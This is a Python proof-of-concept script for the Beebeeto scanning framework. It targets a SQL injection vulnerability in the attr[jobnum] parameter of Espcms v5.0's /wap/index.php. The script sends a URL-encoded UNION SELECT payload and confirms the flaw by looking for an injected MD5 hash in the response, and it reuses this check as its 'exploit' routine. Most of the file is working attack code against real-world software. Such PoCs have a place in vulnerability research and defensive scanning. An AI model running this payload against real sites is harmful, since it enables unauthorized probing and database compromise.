#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0206',
            'name': 'Espcms v5.0 /wap/index.php SQL注入漏洞 POC',
            'author': 'H4rdy',
            'create_date': '2014-12-16',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Espcms',
            'vul_version': ['5.0'],
            'type': 'SQL Injection',
            'tag': ['Espcms v5.0漏洞', 'SQL注入漏洞', '/wap/index.php', 'php'],
            'desc': 'Espcms v5.0 /wap/index.php，attr[jobnum]造成了注入',
            'references': ['http://www.wooyun.org/bugs/wooyun-2013-026820',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = ("/wap/index.php?ac=search&at=result&lng=cn&mid=3&tid=11&keyword=1&keyname="
                   "a.title&countnum=1&attr%5Bjobnum%5D=1%27%20and%201=2%20UNION%20SELECT%201,2,"
                   "3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,concat%28md5%283"
                   ".1415%29%29,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45;%23")
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if "63e1f04640e83605c1d177544a5a0488" in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())